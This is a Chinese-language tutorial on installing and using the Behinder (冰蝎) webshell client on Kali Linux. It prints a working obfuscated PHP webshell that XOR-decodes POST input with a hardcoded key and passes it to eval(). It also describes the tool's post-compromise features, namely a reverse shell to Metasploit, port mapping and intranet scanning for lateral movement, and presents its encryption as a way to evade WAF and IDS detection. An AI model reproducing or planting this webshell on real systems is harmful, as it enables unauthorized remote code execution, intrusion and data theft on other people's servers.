“冰蝎”动态二进制加密网站管理客户端

冰蝎通信过程中使用AES（高级加密算法，对称加密，微信小程序使用此种方法）进行加密，Java和.NET默认支持AES，php中需要开启`openssl`扩展，在V2.0版本后，php环境方式根据服务端支持情况动态选择，使得冰蝎更强大，V3.0中使用预共享密钥，全程无明文交互，给waf、ids设备威胁狩猎带来挑战。

github地址：https://github.com/rebeyond/Behinder
## 在kali中安装

### 运行环境

客户端：jre8+  
服务端：.net 2.0+;php 5.3-7.4;java 6+
### 安装
```
mkdir /usr/local/behinder
cd /usr/local/behinder
wget https://github.com/rebeyond/Behinder/releases/download/Behinder_v4.1%E3%80%90t00ls%E4%B8%93%E7%89%88%E3%80%91/Behinder_v4.1.t00ls.zip
unzip Behinder_v4.1.t00ls.zip

printf '#!/bin/bash\njava -jar /usr/local/behinder/Behinder.jar' > /usr/local/behinder/behinder.sh
chmod +x /usr/local/behinder/behinder.sh
ln -s /usr/local/behinder/behinder.sh /usr/local/bin/behinder
```

- 启动命令：`behinder`
- 手动启动：`java -jar /usr/local/behinder/Behinder.jar`

## 使用

##### 生成webshell

点击传输协议-选择协议名称，修改内容中的关键字后，点击生成服务端

关于密码，我们需要找一个md5加密网站，输入密码后，复制cmd5值小写32位的前16位。

点击生成服务端后，文件存放在`server/default_xor_base64/`

```
<?php  
@error_reporting(0);  
function Decrypt($data)  
{  
    $key="e45e329feb5d925b";   
    $bs="base64_"."decode";  
 $after=$bs($data."");  
 for($i=0;$i<strlen($after);$i++) {  
     $after[$i] = $after[$i]^$key[$i+1&15];   
    }  
    return $after;  
}  
$post=Decrypt(file_get_contents("php://input"));  
@eval($post);  
?>
```

上传连接后，可以使用多种功能：

- 基本信息展示
- 文件管理
- 端口映射
- 反弹shell：可以根据提示配置msf相关信息，然后点击给我连，此时会将会话反弹的msf中
- 内网主机扫描：可以扫描在同一局域网内的设备。从而实现横向渗透


## 官方文档：
#### 功能介绍原文链接：

《利用动态二进制加密实现新型一句话木马之客户端篇》 [https://xz.aliyun.com/t/2799](https://xz.aliyun.com/t/2799)

#### 工作原理原文链接：

《利用动态二进制加密实现新型一句话木马之Java篇》 [https://xz.aliyun.com/t/2744](https://xz.aliyun.com/t/2744)

《利用动态二进制加密实现新型一句话木马之.NET篇》 [https://xz.aliyun.com/t/2758](https://xz.aliyun.com/t/2758)

《利用动态二进制加密实现新型一句话木马之PHP篇》 [https://xz.aliyun.com/t/2774](https://xz.aliyun.com/t/2774)

#### 传输协议原理解析：

《冰蝎v4.0传输协议详解》 [https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A](https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A)

